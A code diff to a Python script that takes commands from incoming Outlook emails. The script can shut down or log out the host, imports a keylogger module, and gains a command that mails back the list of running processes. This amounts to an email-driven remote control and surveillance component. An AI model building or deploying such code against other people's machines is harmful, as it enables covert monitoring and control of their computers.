@@ -3,10 +3,16 @@ from datetime import datetime, timedelta
 import keylogger_server
 import shutdown_logout_server
 import win32com.client
+import app_process_server
 
 outlook = win32com.client.Dispatch("Outlook.Application").GetNamespace("MAPI")
 islock = 0
 machineState = 1
+
+listName = list()
+listPid = list()
+listProcess = list()
+
 def sendBack(subject,body,sendTo):
     repMailItem = win32com.client.Dispatch("Outlook.Application").CreateItem(0)
     repMailItem.Subject = subject
@@ -18,7 +24,7 @@ def sendBack(subject,body,sendTo):
     repMailItem.Send()
 
 def listen(msg):
-    global islock,machineState
+    global islock,machineState,listName,listPid,listProcess
     string = msg.lower().strip().split()
     rep = ""
     if "mapi" == string[0]:
@@ -45,7 +51,11 @@ def listen(msg):
             elif "logout" == string[2]:
                 machineState = 2
                 rep = "The system is logout"
-    return rep
+        if "soft" == string[1]:
+                listName,listPid,listProcess = app_process_server.app_process(''.join(string))
+                rep ="\n".join(listName)
+
+    return msg + "\nREP:\n"+ rep
 
 inbox = outlook.GetDefaultFolder(6)
 messages = inbox.Items
@@ -61,9 +71,9 @@ while True:
             mailDefault = mailNow
             print(True)
 
-        if(machineSate == 0):
+        if machineState == 0:
             shutdown_logout_server.shutdown_logout("shutdown")
-        elif machineState == 2 :
+        elif machineState == 2:
             shutdown_logout_server.shutdown_logout("logout")
     else:
         print(False)
